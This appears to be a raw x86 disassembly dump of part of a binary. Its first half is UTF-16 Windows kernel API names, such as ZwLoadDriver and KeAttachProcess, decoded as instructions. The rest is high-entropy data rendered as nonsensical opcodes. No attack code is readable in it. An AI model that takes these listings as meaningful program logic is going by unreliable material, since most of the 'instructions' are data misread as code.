   1e0c0:	add    BYTE PTR [eax],al
   1e0c2:	pop    edx
   1e0c3:	add    BYTE PTR [edi+0x0],dh
   1e0c6:	push   ebx
   1e0c7:	add    BYTE PTR [ebp+0x0],ah
   1e0ca:	je     0x1e0cc
   1e0cc:	push   esi
   1e0cd:	add    BYTE PTR [ecx+0x0],ah
   1e0d0:	ins    BYTE PTR es:[edi],dx
   1e0d1:	add    BYTE PTR [ebp+0x0],dh
   1e0d4:	add    BYTE PTR gs:[ebx+0x0],cl
   1e0d8:	add    BYTE PTR gs:[ecx+0x0],bh
   1e0dc:	add    BYTE PTR [eax],al
   1e0de:	pop    edx
   1e0df:	add    BYTE PTR [edi+0x0],dh
   1e0e2:	push   ecx
   1e0e3:	add    BYTE PTR [ebp+0x0],dh
   1e0e6:	add    BYTE PTR gs:[edx+0x0],dh
   1e0ea:	jns    0x1e0ec
   1e0ec:	push   esi
   1e0ed:	add    BYTE PTR [edi+0x0],ch
   1e0f0:	ins    BYTE PTR es:[edi],dx
   1e0f1:	add    BYTE PTR [ebp+0x0],dh
   1e0f4:	ins    DWORD PTR es:[edi],dx
   1e0f5:	add    BYTE PTR [ebp+0x0],ah
   1e0f8:	dec    ecx
   1e0f9:	add    BYTE PTR [esi+0x0],ch
   1e0fc:	data16 add BYTE PTR [edi+0x0],ch
   1e100:	jb     0x1e102
   1e102:	ins    DWORD PTR es:[edi],dx
   1e103:	add    BYTE PTR [ecx+0x0],ah
   1e106:	je     0x1e108
   1e108:	imul   eax,DWORD PTR [eax],0x6e006f
   1e10e:	inc    esi
   1e10f:	add    BYTE PTR [ecx+0x0],ch
   1e112:	ins    BYTE PTR es:[edi],dx
   1e113:	add    BYTE PTR [ebp+0x0],ah
   1e116:	add    BYTE PTR [eax],al
   1e118:	pop    edx
   1e119:	add    BYTE PTR [edi+0x0],dh
   1e11c:	inc    ebx
   1e11d:	add    BYTE PTR [edx+0x0],dh
   1e120:	add    BYTE PTR gs:[ecx+0x0],ah
   1e124:	je     0x1e126
   1e126:	add    BYTE PTR gs:[esi+0x0],al
   1e12a:	imul   eax,DWORD PTR [eax],0x65006c
   1e130:	add    BYTE PTR [eax],al
   1e132:	push   edx
   1e133:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e137:	add    BYTE PTR [ecx+0x0],cl
   1e13a:	ins    DWORD PTR es:[edi],dx
   1e13b:	add    BYTE PTR [ecx+0x0],ah
   1e13e:	add    BYTE PTR [di+0x0],ah
   1e142:	dec    esi
   1e143:	add    BYTE PTR [eax+eax*1+0x48],dh
   1e147:	add    BYTE PTR [ebp+0x0],ah
   1e14a:	popa   
   1e14b:	add    BYTE PTR [eax+eax*1+0x65],ah
   1e14f:	add    BYTE PTR [edx+0x0],dh
   1e152:	add    BYTE PTR [eax],al
   1e154:	push   edx
   1e155:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e159:	add    BYTE PTR [ecx+0x0],cl
   1e15c:	ins    DWORD PTR es:[edi],dx
   1e15d:	add    BYTE PTR [ecx+0x0],ah
   1e160:	add    BYTE PTR [di+0x0],ah
   1e164:	inc    esp
   1e165:	add    BYTE PTR [ecx+0x0],ch
   1e168:	jb     0x1e16a
   1e16a:	add    BYTE PTR gs:[ebx+0x0],ah
   1e16e:	je     0x1e170
   1e170:	outs   dx,DWORD PTR ds:[esi]
   1e171:	add    BYTE PTR [edx+0x0],dh
   1e174:	jns    0x1e176
   1e176:	inc    ebp
   1e177:	add    BYTE PTR [esi+0x0],ch
   1e17a:	je     0x1e17c
   1e17c:	jb     0x1e17e
   1e17e:	jns    0x1e180
   1e180:	push   esp
   1e181:	add    BYTE PTR [edi+0x0],ch
   1e184:	inc    esp
   1e185:	add    BYTE PTR [ecx+0x0],ah
   1e188:	je     0x1e18a
   1e18a:	popa   
   1e18b:	add    BYTE PTR [eax],al
   1e18d:	add    BYTE PTR [edx+0x0],bl
   1e190:	ja     0x1e192
   1e192:	dec    edi
   1e193:	add    BYTE PTR [eax+0x0],dh
   1e196:	add    BYTE PTR gs:[esi+0x0],ch
   1e19a:	push   eax
   1e19b:	add    BYTE PTR [edx+0x0],dh
   1e19e:	outs   dx,DWORD PTR ds:[esi]
   1e19f:	add    BYTE PTR [ebx+0x0],ah
   1e1a2:	add    BYTE PTR gs:[ebx+0x0],dh
   1e1a6:	jae    0x1e1a8
   1e1a8:	push   esp
   1e1a9:	add    BYTE PTR [edi+0x0],ch
   1e1ac:	imul   eax,DWORD PTR [eax],0x65
   1e1af:	add    BYTE PTR [esi+0x0],ch
   1e1b2:	add    BYTE PTR [eax],al
   1e1b4:	pop    edx
   1e1b5:	add    BYTE PTR [edi+0x0],dh
   1e1b8:	push   ebx
   1e1b9:	add    BYTE PTR [ebp+0x0],ah
   1e1bc:	je     0x1e1be
   1e1be:	dec    ecx
   1e1bf:	add    BYTE PTR [esi+0x0],ch
   1e1c2:	data16 add BYTE PTR [edi+0x0],ch
   1e1c6:	jb     0x1e1c8
   1e1c8:	ins    DWORD PTR es:[edi],dx
   1e1c9:	add    BYTE PTR [ecx+0x0],ah
   1e1cc:	je     0x1e1ce
   1e1ce:	imul   eax,DWORD PTR [eax],0x6e006f
   1e1d4:	push   eax
   1e1d5:	add    BYTE PTR [edx+0x0],dh
   1e1d8:	outs   dx,DWORD PTR ds:[esi]
   1e1d9:	add    BYTE PTR [ebx+0x0],ah
   1e1dc:	add    BYTE PTR gs:[ebx+0x0],dh
   1e1e0:	jae    0x1e1e2
   1e1e2:	add    BYTE PTR [eax],al
   1e1e4:	pop    edx
   1e1e5:	add    BYTE PTR [edi+0x0],dh
   1e1e8:	push   ecx
   1e1e9:	add    BYTE PTR [ebp+0x0],dh
   1e1ec:	add    BYTE PTR gs:[edx+0x0],dh
   1e1f0:	jns    0x1e1f2
   1e1f2:	dec    ecx
   1e1f3:	add    BYTE PTR [esi+0x0],ch
   1e1f6:	data16 add BYTE PTR [edi+0x0],ch
   1e1fa:	jb     0x1e1fc
   1e1fc:	ins    DWORD PTR es:[edi],dx
   1e1fd:	add    BYTE PTR [ecx+0x0],ah
   1e200:	je     0x1e202
   1e202:	imul   eax,DWORD PTR [eax],0x6e006f
   1e208:	push   esp
   1e209:	add    BYTE PTR [eax+0x0],ch
   1e20c:	jb     0x1e20e
   1e20e:	add    BYTE PTR gs:[ecx+0x0],ah
   1e212:	add    BYTE PTR fs:[eax],al
   1e215:	add    BYTE PTR [edx+0x0],dl
   1e218:	je     0x1e21a
   1e21a:	ins    BYTE PTR es:[edi],dx
   1e21b:	add    BYTE PTR [ecx+0x0],al
   1e21e:	jae    0x1e220
   1e220:	jae    0x1e222
   1e222:	add    BYTE PTR gs:[edx+0x0],dh
   1e226:	je     0x1e228
   1e228:	add    BYTE PTR [eax],al
   1e22a:	pop    edx
   1e22b:	add    BYTE PTR [edi+0x0],dh
   1e22e:	inc    ebp
   1e22f:	add    BYTE PTR [esi+0x0],ch
   1e232:	jne    0x1e234
   1e234:	ins    DWORD PTR es:[edi],dx
   1e235:	add    BYTE PTR [ebp+0x0],ah
   1e238:	jb     0x1e23a
   1e23a:	popa   
   1e23b:	add    BYTE PTR [eax+eax*1+0x65],dh
   1e23f:	add    BYTE PTR [ebx+0x0],cl
   1e242:	add    BYTE PTR gs:[ecx+0x0],bh
   1e246:	add    BYTE PTR [eax],al
   1e248:	pop    edx
   1e249:	add    BYTE PTR [edi+0x0],dh
   1e24c:	dec    esp
   1e24d:	add    BYTE PTR [edi+0x0],ch
   1e250:	popa   
   1e251:	add    BYTE PTR [eax+eax*1+0x44],ah
   1e255:	add    BYTE PTR [edx+0x0],dh
   1e258:	imul   eax,DWORD PTR [eax],0x650076
   1e25e:	jb     0x1e260
   1e260:	add    BYTE PTR [eax],al
   1e262:	pop    edx
   1e263:	add    BYTE PTR [edi+0x0],dh
   1e266:	inc    ebx
   1e267:	add    BYTE PTR [edx+0x0],dh
   1e26a:	add    BYTE PTR gs:[ecx+0x0],ah
   1e26e:	je     0x1e270
   1e270:	add    BYTE PTR gs:[ebx+0x0],cl
   1e274:	add    BYTE PTR gs:[ecx+0x0],bh
   1e278:	add    BYTE PTR [eax],al
   1e27a:	dec    ecx
   1e27b:	add    BYTE PTR [edi+0x0],ch
   1e27e:	inc    esp
   1e27f:	add    BYTE PTR [ebp+0x0],ah
   1e282:	ins    BYTE PTR es:[edi],dx
   1e283:	add    BYTE PTR [ebp+0x0],ah
   1e286:	je     0x1e288
   1e288:	add    BYTE PTR gs:[eax+eax*1+0x65],al
   1e28d:	add    BYTE PTR [esi+0x0],dh
   1e290:	imul   eax,DWORD PTR [eax],0x650063
   1e296:	add    BYTE PTR [eax],al
   1e298:	dec    ebx
   1e299:	add    BYTE PTR [ebp+0x0],ah
   1e29c:	inc    esp
   1e29d:	add    BYTE PTR [ebp+0x0],ah
   1e2a0:	je     0x1e2a2
   1e2a2:	popa   
   1e2a3:	add    BYTE PTR [ebx+0x0],ah
   1e2a6:	push   0x72005000
   1e2ab:	add    BYTE PTR [edi+0x0],ch
   1e2ae:	arpl   WORD PTR [eax],ax
   1e2b0:	add    BYTE PTR gs:[ebx+0x0],dh
   1e2b4:	jae    0x1e2b6
   1e2b6:	add    BYTE PTR [eax],al
   1e2b8:	dec    ebx
   1e2b9:	add    BYTE PTR [ebp+0x0],ah
   1e2bc:	inc    ecx
   1e2bd:	add    BYTE PTR [eax+eax*1+0x74],dh
   1e2c1:	add    BYTE PTR [ecx+0x0],ah
   1e2c4:	arpl   WORD PTR [eax],ax
   1e2c6:	push   0x72005000
   1e2cb:	add    BYTE PTR [edi+0x0],ch
   1e2ce:	arpl   WORD PTR [eax],ax
   1e2d0:	add    BYTE PTR gs:[ebx+0x0],dh
   1e2d4:	jae    0x1e2d6
   1e2d6:	add    BYTE PTR [eax],al
   1e2d8:	pop    edx
   1e2d9:	add    BYTE PTR [edi+0x0],dh
   1e2dc:	push   ecx
   1e2dd:	add    BYTE PTR [ebp+0x0],dh
   1e2e0:	add    BYTE PTR gs:[edx+0x0],dh
   1e2e4:	jns    0x1e2e6
   1e2e6:	push   esi
   1e2e7:	add    BYTE PTR [ecx+0x0],ah
   1e2ea:	ins    BYTE PTR es:[edi],dx
   1e2eb:	add    BYTE PTR [ebp+0x0],dh
   1e2ee:	add    BYTE PTR gs:[ebx+0x0],cl
   1e2f2:	add    BYTE PTR gs:[ecx+0x0],bh
   1e2f6:	add    BYTE PTR [eax],al
   1e2f8:	pop    edx
   1e2f9:	add    BYTE PTR [edi+0x0],dh
   1e2fc:	push   edx
   1e2fd:	add    BYTE PTR [ebp+0x0],ah
   1e300:	popa   
   1e301:	add    BYTE PTR [eax+eax*1+0x46],ah
   1e305:	add    BYTE PTR [ecx+0x0],ch
   1e308:	ins    BYTE PTR es:[edi],dx
   1e309:	add    BYTE PTR [ebp+0x0],ah
   1e30c:	add    BYTE PTR [eax],al
   1e30e:	pop    edx
   1e30f:	add    BYTE PTR [edi+0x0],dh
   1e312:	push   ebx
   1e313:	add    BYTE PTR [ebp+0x0],ah
   1e316:	je     0x1e318
   1e318:	dec    ecx
   1e319:	add    BYTE PTR [esi+0x0],ch
   1e31c:	data16 add BYTE PTR [edi+0x0],ch
   1e320:	jb     0x1e322
   1e322:	ins    DWORD PTR es:[edi],dx
   1e323:	add    BYTE PTR [ecx+0x0],ah
   1e326:	je     0x1e328
   1e328:	imul   eax,DWORD PTR [eax],0x6e006f
   1e32e:	inc    esi
   1e32f:	add    BYTE PTR [ecx+0x0],ch
   1e332:	ins    BYTE PTR es:[edi],dx
   1e333:	add    BYTE PTR [ebp+0x0],ah
   1e336:	add    BYTE PTR [eax],al
   1e338:	pop    edx
   1e339:	add    BYTE PTR [edi+0x0],dh
   1e33c:	push   edi
   1e33d:	add    BYTE PTR [edx+0x0],dh
   1e340:	imul   eax,DWORD PTR [eax],0x650074
   1e346:	inc    esi
   1e347:	add    BYTE PTR [ecx+0x0],ch
   1e34a:	ins    BYTE PTR es:[edi],dx
   1e34b:	add    BYTE PTR [ebp+0x0],ah
   1e34e:	add    BYTE PTR [eax],al
   1e350:	pop    edx
   1e351:	add    BYTE PTR [edi+0x0],dh
   1e354:	push   ecx
   1e355:	add    BYTE PTR [ebp+0x0],dh
   1e358:	add    BYTE PTR gs:[edx+0x0],dh
   1e35c:	jns    0x1e35e
   1e35e:	dec    ecx
   1e35f:	add    BYTE PTR [esi+0x0],ch
   1e362:	data16 add BYTE PTR [edi+0x0],ch
   1e366:	jb     0x1e368
   1e368:	ins    DWORD PTR es:[edi],dx
   1e369:	add    BYTE PTR [ecx+0x0],ah
   1e36c:	je     0x1e36e
   1e36e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e374:	inc    esi
   1e375:	add    BYTE PTR [ecx+0x0],ch
   1e378:	ins    BYTE PTR es:[edi],dx
   1e379:	add    BYTE PTR [ebp+0x0],ah
   1e37c:	add    BYTE PTR [eax],al
   1e37e:	dec    ecx
   1e37f:	add    BYTE PTR [edi+0x0],ch
   1e382:	inc    ebx
   1e383:	add    BYTE PTR [edx+0x0],dh
   1e386:	add    BYTE PTR gs:[ecx+0x0],ah
   1e38a:	je     0x1e38c
   1e38c:	add    BYTE PTR gs:[ebx+0x0],dl
   1e390:	jns    0x1e392
   1e392:	ins    DWORD PTR es:[edi],dx
   1e393:	add    BYTE PTR [edx+0x0],ah
   1e396:	outs   dx,DWORD PTR ds:[esi]
   1e397:	add    BYTE PTR [eax+eax*1+0x69],ch
   1e39b:	add    BYTE PTR [ebx+0x0],ah
   1e39e:	dec    esp
   1e39f:	add    BYTE PTR [ecx+0x0],ch
   1e3a2:	outs   dx,BYTE PTR ds:[esi]
   1e3a3:	add    BYTE PTR [ebx+0x0],ch
   1e3a6:	add    BYTE PTR [eax],al
   1e3a8:	dec    ecx
   1e3a9:	add    BYTE PTR [edi+0x0],ch
   1e3ac:	inc    ebx
   1e3ad:	add    BYTE PTR [edx+0x0],dh
   1e3b0:	add    BYTE PTR gs:[ecx+0x0],ah
   1e3b4:	je     0x1e3b6
   1e3b6:	add    BYTE PTR gs:[eax+eax*1+0x65],al
   1e3bb:	add    BYTE PTR [esi+0x0],dh
   1e3be:	imul   eax,DWORD PTR [eax],0x650063
   1e3c4:	add    BYTE PTR [eax],al
   1e3c6:	push   ebx
   1e3c7:	add    BYTE PTR [ebp+0x0],ah
   1e3ca:	inc    ebx
   1e3cb:	add    BYTE PTR [edx+0x0],dh
   1e3ce:	add    BYTE PTR gs:[ecx+0x0],ah
   1e3d2:	je     0x1e3d4
   1e3d4:	add    BYTE PTR gs:[ebx+0x0],al
   1e3d8:	ins    BYTE PTR es:[edi],dx
   1e3d9:	add    BYTE PTR [ecx+0x0],ch
   1e3dc:	add    BYTE PTR gs:[esi+0x0],ch
   1e3e0:	je     0x1e3e2
   1e3e2:	push   ebx
   1e3e3:	add    BYTE PTR [ebp+0x0],ah
   1e3e6:	arpl   WORD PTR [eax],ax
   1e3e8:	jne    0x1e3ea
   1e3ea:	jb     0x1e3ec
   1e3ec:	imul   eax,DWORD PTR [eax],0x790074
   1e3f2:	add    BYTE PTR [eax],al
   1e3f4:	pop    edx
   1e3f5:	add    BYTE PTR [edi+0x0],dh
   1e3f8:	dec    ebp
   1e3f9:	add    BYTE PTR [ecx+0x0],ah
   1e3fc:	jo     0x1e3fe
   1e3fe:	push   esi
   1e3ff:	add    BYTE PTR [ecx+0x0],ch
   1e402:	add    BYTE PTR gs:[edi+0x0],dh
   1e406:	dec    edi
   1e407:	add    BYTE PTR [esi+0x0],ah
   1e40a:	push   ebx
   1e40b:	add    BYTE PTR [ebp+0x0],ah
   1e40e:	arpl   WORD PTR [eax],ax
   1e410:	je     0x1e412
   1e412:	imul   eax,DWORD PTR [eax],0x6e006f
   1e418:	add    BYTE PTR [eax],al
   1e41a:	pop    edx
   1e41b:	add    BYTE PTR [edi+0x0],dh
   1e41e:	push   ebp
   1e41f:	add    BYTE PTR [esi+0x0],ch
   1e422:	ins    DWORD PTR es:[edi],dx
   1e423:	add    BYTE PTR [ecx+0x0],ah
   1e426:	jo     0x1e428
   1e428:	push   esi
   1e429:	add    BYTE PTR [ecx+0x0],ch
   1e42c:	add    BYTE PTR gs:[edi+0x0],dh
   1e430:	dec    edi
   1e431:	add    BYTE PTR [esi+0x0],ah
   1e434:	push   ebx
   1e435:	add    BYTE PTR [ebp+0x0],ah
   1e438:	arpl   WORD PTR [eax],ax
   1e43a:	je     0x1e43c
   1e43c:	imul   eax,DWORD PTR [eax],0x6e006f
   1e442:	add    BYTE PTR [eax],al
   1e444:	dec    ebx
   1e445:	add    BYTE PTR [ebp+0x0],ah
   1e448:	dec    ecx
   1e449:	add    BYTE PTR [esi+0x0],ch
   1e44c:	imul   eax,DWORD PTR [eax],0x690074
   1e452:	popa   
   1e453:	add    BYTE PTR [eax+eax*1+0x69],ch
   1e457:	add    BYTE PTR [edx+0x0],bh
   1e45a:	add    BYTE PTR gs:[ebp+0x0],cl
   1e45e:	jne    0x1e460
   1e460:	je     0x1e462
   1e462:	add    BYTE PTR gs:[eax+0x0],bh
   1e466:	add    BYTE PTR [eax],al
   1e468:	push   edx
   1e469:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e46d:	add    BYTE PTR [ecx+0x0],cl
   1e470:	outs   dx,BYTE PTR ds:[esi]
   1e471:	add    BYTE PTR [ecx+0x0],ch
   1e474:	je     0x1e476
   1e476:	push   ebp
   1e477:	add    BYTE PTR [esi+0x0],ch
   1e47a:	imul   eax,DWORD PTR [eax],0x6f0063
   1e480:	add    BYTE PTR fs:[ebp+0x0],ah
   1e484:	push   ebx
   1e485:	add    BYTE PTR [eax+eax*1+0x72],dh
   1e489:	add    BYTE PTR [ecx+0x0],ch
   1e48c:	outs   dx,BYTE PTR ds:[esi]
   1e48d:	add    BYTE PTR [edi+0x0],ah
   1e490:	add    BYTE PTR [eax],al
   1e492:	dec    edi
   1e493:	add    BYTE PTR [edx+0x0],ah
   1e496:	data16 add BYTE PTR [eax+eax*1+0x65],al
   1e49b:	add    BYTE PTR [edx+0x0],dh
   1e49e:	add    BYTE PTR gs:[esi+0x0],ah
   1e4a2:	add    BYTE PTR gs:[edx+0x0],dh
   1e4a6:	add    BYTE PTR gs:[esi+0x0],ch
   1e4aa:	arpl   WORD PTR [eax],ax
   1e4ac:	add    BYTE PTR gs:[edi+0x0],cl
   1e4b0:	bound  eax,QWORD PTR [eax]
   1e4b2:	push   0x0
   1e4b4:	add    BYTE PTR gs:[ebx+0x0],ah
   1e4b8:	je     0x1e4ba
   1e4ba:	add    BYTE PTR [eax],al
   1e4bc:	push   eax
   1e4bd:	add    BYTE PTR [ebx+0x0],dh
   1e4c0:	dec    esp
   1e4c1:	add    BYTE PTR [edi+0x0],ch
   1e4c4:	outs   dx,DWORD PTR ds:[esi]
   1e4c5:	add    BYTE PTR [ebx+0x0],ch
   1e4c8:	jne    0x1e4ca
   1e4ca:	jo     0x1e4cc
   1e4cc:	push   eax
   1e4cd:	add    BYTE PTR [edx+0x0],dh
   1e4d0:	outs   dx,DWORD PTR ds:[esi]
   1e4d1:	add    BYTE PTR [ebx+0x0],ah
   1e4d4:	add    BYTE PTR gs:[ebx+0x0],dh
   1e4d8:	jae    0x1e4da
   1e4da:	inc    edx
   1e4db:	add    BYTE PTR [ecx+0x0],bh
   1e4de:	push   eax
   1e4df:	add    BYTE PTR [edx+0x0],dh
   1e4e2:	outs   dx,DWORD PTR ds:[esi]
   1e4e3:	add    BYTE PTR [ebx+0x0],ah
   1e4e6:	add    BYTE PTR gs:[ebx+0x0],dh
   1e4ea:	jae    0x1e4ec
   1e4ec:	dec    ecx
   1e4ed:	add    BYTE PTR [eax+eax*1+0x0],ah
   1e4f1:	add    BYTE PTR [ebx+0x0],cl
   1e4f4:	add    BYTE PTR gs:[edi+0x0],al
   1e4f8:	add    BYTE PTR gs:[eax+eax*1+0x43],dh
   1e4fd:	add    BYTE PTR [ebp+0x0],dh
   1e500:	jb     0x1e502
   1e502:	jb     0x1e504
   1e504:	add    BYTE PTR gs:[esi+0x0],ch
   1e508:	je     0x1e50a
   1e50a:	push   esp
   1e50b:	add    BYTE PTR [eax+0x0],ch
   1e50e:	jb     0x1e510
   1e510:	add    BYTE PTR gs:[ecx+0x0],ah
   1e514:	add    BYTE PTR fs:[eax],al
   1e517:	add    BYTE PTR [eax+eax*1+0x2d],dl
   1e51b:	add    BYTE PTR [ecx],cl
   1e51d:	add    BYTE PTR ds:0x2f000000,dl
   1e523:	mov    ch,0x90
   1e525:	(bad)  
   1e526:	fst    QWORD PTR [ebx+0x73a28781]
   1e52c:	and    al,0x61
   1e52e:	adc    BYTE PTR [edi-0x68373b4c],0x22
   1e535:	out    dx,al
   1e536:	sub    ch,bl
   1e538:	cmp    ecx,ecx
   1e53a:	cld    
   1e53b:	retf   0x156
   1e53e:	mov    WORD PTR [edx+ebp*2-0x8e72e10],?
   1e545:	sub    BYTE PTR [edi+0x0],0x53
   1e549:	add    BYTE PTR [edi],ah
   1e54b:	add    BYTE PTR ds:0x6001300,dl
   1e551:	add    BYTE PTR [eax],al
   1e553:	add    BYTE PTR [ebx-0x297ab31],cl
   1e559:	call   0xd720:0x2d83d21b
   1e560:	out    dx,eax
   1e561:	cmc    
   1e562:	cwde   
   1e563:	sti    
   1e564:	ja     0x1e54a
   1e566:	leave  
   1e567:	add    ch,BYTE PTR [ebp-0x77]
   1e56a:	add    bl,0x45
   1e56d:	push   es
   1e56e:	(bad)  
   1e56f:	pop    esi
   1e570:	push   cs
   1e571:	in     eax,0x81
   1e573:	xchg   esp,eax
   1e574:	sahf   
   1e575:	inc    edx
   1e576:	xor    al,0x9b
   1e578:	sahf   
   1e579:	or     DWORD PTR [ebp-0x13],esi
   1e57c:	dec    ecx
   1e57d:	test   BYTE PTR [ebx-0x1a4ecee1],dl
   1e583:	xchg   ebp,eax
   1e584:	jb     0x1e5d8
   1e586:	lods   al,BYTE PTR ds:[esi]
   1e587:	dec    esp
   1e588:	jmp    0x2400:0x49cc00e2
   1e58f:	add    BYTE PTR [eax+eax*1],cl
   1e592:	push   es
   1e593:	add    BYTE PTR [edx],al
   1e595:	add    BYTE PTR ds:0x15003100,dh
   1e59b:	add    BYTE PTR [eax+eax*1],bl
   1e59e:	add    BYTE PTR [eax],al
   1e5a0:	ins    DWORD PTR es:[edi],dx
   1e5a1:	push   0x6b
   1e5a3:	(bad)  
   1e5a4:	sub    eax,0x4ba47447
   1e5a9:	mov    bl,0x38
   1e5ab:	pop    edx
   1e5ac:	sbb    al,0xbe
   1e5ae:	pop    ss
   1e5af:	out    0x26,al
   1e5b1:	dec    di
   1e5b3:	push   ss
   1e5b4:	cld    
   1e5b5:	push   ecx
   1e5b6:	loope  0x1e567
   1e5b8:	js     0x1e5e4
   1e5ba:	cmp    DWORD PTR [ebx-0x50],esp
   1e5bd:	mov    ecx,0xe553a7a7
   1e5c2:	dec    ecx
   1e5c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1e5c4:	mov    ecx,0x2e009e60
   1e5c9:	add    BYTE PTR [edx+0x0],cl
   1e5cc:	or     BYTE PTR [eax],al
   1e5ce:	add    BYTE PTR [eax],al
   1e5d0:	add    BYTE PTR [eax],al
   1e5d2:	sub    esp,DWORD PTR [eax]
   1e5d4:	add    DWORD PTR cs:[ecx],esi
   1e5d7:	nop
   1e5d8:	dec    esi
   1e5d9:	dec    eax
   1e5da:	push   ebp
   1e5db:	test   BYTE PTR [edx-0x3f],0xc0
   1e5df:	pop    ebp
   1e5e0:	rcr    BYTE PTR [ecx+ebx*2+0x793c08c2],0xf2
   1e5e8:	(bad)  
   1e5e9:	pushf  
   1e5ea:	sub    ch,dh
   1e5ec:	ins    BYTE PTR es:[edi],dx
   1e5ed:	in     al,dx
   1e5ee:	inc    ecx
   1e5ef:	je     0x1e65c
   1e5f1:	pop    ecx
   1e5f2:	out    0xeb,al
   1e5f4:	rol    BYTE PTR [ebp+0x2f76cd1b],0x50
   1e5fb:	xor    edi,DWORD PTR [edx+0x4a]
   1e5fe:	pop    ss
   1e5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1e600:	and    al,0x0
   1e602:	outs   dx,BYTE PTR ds:[esi]
   1e603:	add    BYTE PTR [edx],bl
   1e605:	add    BYTE PTR [eax],dl
   1e607:	add    BYTE PTR [eax],cl
   1e609:	add    BYTE PTR [eax],al
   1e60b:	add    BYTE PTR [edx+0x0],al
   1e60e:	dec    edx
   1e60f:	add    BYTE PTR [eax],cl
   1e611:	add    BYTE PTR [eax],al
   1e613:	add    BYTE PTR [eax],al
   1e615:	add    ch,ch
   1e617:	outs   dx,DWORD PTR ds:[esi]
   1e618:	push   ebx
   1e619:	pop    edx
   1e61a:	push   0x95b569da
   1e61f:	jmp    0x261c1eb2
   1e624:	cwde   
   1e625:	cmp    BYTE PTR [ebp-0x13],al
   1e628:	mov    bh,0x41
   1e62a:	les    ecx,FWORD PTR [edx+0x50]
   1e62d:	sub    DWORD PTR [edx],ebx
   1e62f:	lahf   
   1e630:	xor    BYTE PTR [ebx-0x52d44590],0x5d
   1e637:	push   ebp
   1e638:	jl     0x1e607
   1e63a:	stos   BYTE PTR es:[edi],al
   1e63b:	or     eax,0x2742cc00
   1e640:	add    BYTE PTR ds:0x104bcc00,dl
   1e646:	ret    0xa59c
   1e649:	cmc    
   1e64a:	add    esp,DWORD PTR [edi-0x1d]
   1e64d:	mov    esp,0xcf0278f3
   1e652:	xor    eax,0xb89911e1
   1e657:	int    0xc3
   1e659:	(bad)  
   1e65a:	in     al,dx
   1e65b:	das    
   1e65c:	cmp    dl,bh
   1e65e:	call   0x4cb9c71e
   1e663:	cmp    BYTE PTR [ecx],cl
   1e665:	into   
   1e666:	scas   eax,DWORD PTR es:[edi]
   1e667:	xchg   edx,eax
   1e668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1e669:	ret    
   1e66a:	cwde   
   1e66b:	cld    
   1e66c:	inc    ebx
   1e66d:	out    0xa9,eax
   1e66f:	adc    al,0x84
   1e671:	addr16 jge 0x1e6ad
   1e674:	scas   eax,DWORD PTR es:[edi]
   1e675:	repz xchg edx,eax
   1e677:	mov    edx,0x877c9c64
   1e67c:	iret   
   1e67d:	push   esp
   1e67e:	push   ebx
   1e67f:	mov    al,ds:0xcc00e532
   1e684:	push   ebx
   1e685:	aas    
   1e686:	or     DWORD PTR [eax],eax
   1e688:	adc    eax,0xf4c46d00
   1e68d:	test   DWORD PTR [eax],eax
   1e68f:	mov    al,0x85
   1e691:	fcomp  DWORD PTR [ebp+0x310aa416]
   1e697:	out    dx,eax
   1e698:	imul   esp,DWORD PTR [ecx+0x10],0x0
   1e69c:	test   ebx,0x33b5a67a
   1e6a2:	cmp    dl,ah
   1e6a4:	sbb    BYTE PTR [ecx+0x3d],al
   1e6a7:	mov    al,ds:0xadc499c
   1e6ac:	inc    edx
   1e6ad:	ins    BYTE PTR es:[edi],dx
   1e6ae:	mov    ebp,DWORD PTR [ebx+0x29]
   1e6b1:	imul   edx,DWORD PTR [edi+0x0],0x4173143
   1e6b8:	adc    eax,0x1a3c3111
   1e6bd:	pop    ss
   1e6be:	add    al,0x5
   1e6c0:	add    ah,cl
   1e6c2:	pop    ecx
   1e6c3:	inc    eax
   1e6c4:	fiadd  WORD PTR [edx]
   1e6c6:	imul   edx,DWORD PTR [eax],0xffffffcc
   1e6c9:	ss cli 
   1e6cb:	xor    edi,edi
   1e6cd:	int3   
   1e6ce:	mul    ch
   1e6d0:	pop    ds
   1e6d1:	jge    0x1e689
   1e6d3:	adc    DWORD PTR [ebp+0x1e677021],ebp
   1e6d9:	lea    eax,[eax]
   1e6db:	das    
   1e6dc:	xlat   BYTE PTR es:[ebx]
   1e6de:	jmp    0x1e6c8
   1e6e0:	cmp    BYTE PTR ds:0xa4b7c975,dh
   1e6e6:	scas   eax,DWORD PTR es:[edi]
   1e6e7:	fiadd  DWORD PTR [eax]
   1e6e9:	int3   
   1e6ea:	dec    esp
   1e6eb:	and    ecx,DWORD PTR [esi]
   1e6ed:	add    eax,0x100b2528
   1e6f2:	adc    edx,DWORD PTR [ebx]
   1e6f4:	or     edi,DWORD PTR [eax]
   1e6f6:	add    ah,cl
   1e6f8:	pushf  
   1e6f9:	imul   di,bp,0x47
   1e6fd:	xchg   edx,eax
   1e6fe:	lock and DWORD PTR [eax],edi
   1e701:	pop    edi
   1e702:	int3   
   1e703:	rcr    ebx,1
   1e705:	pushf  
   1e706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1e707:	and    BYTE PTR [edi],0xdf
   1e70a:	mov    dh,0x7f
   1e70c:	mov    eax,ds:0x87b5f632
   1e711:	mov    al,0x1f
   1e713:	mov    ds:0x4d893233,al
   1e718:	add    ch,BYTE PTR [eax-0x427db1de]
   1e71e:	push   esi
   1e71f:	push   ss
   1e720:	pushf  
   1e721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   1e722:	into   
   1e723:	sub    edx,eax
   1e725:	add    BYTE PTR [ebx+eiz*1+0xe],cl
   1e729:	add    eax,0x100b2528
   1e72e:	adc    edx,DWORD PTR [ebx]
   1e730:	or     ebp,DWORD PTR [esi]
   1e732:	add    ah,cl
   1e734:	scas   eax,DWORD PTR es:[edi]
   1e735:	push   ebx
   1e736:	cmc    
   1e737:	jmp    0xa218df6d
   1e73c:	add    esi,edi
   1e73e:	sahf   
   1e73f:	mov    bh,0x4c
   1e741:	lea    eax,[ebp+0x2f40d7c0]
   1e747:	or     edx,DWORD PTR [edx+ebx*1]
   1e74a:	loope  0x1e78f
   1e74c:	inc    ebx
   1e74d:	sub    ebp,edi
   1e74f:	mov    esp,esi
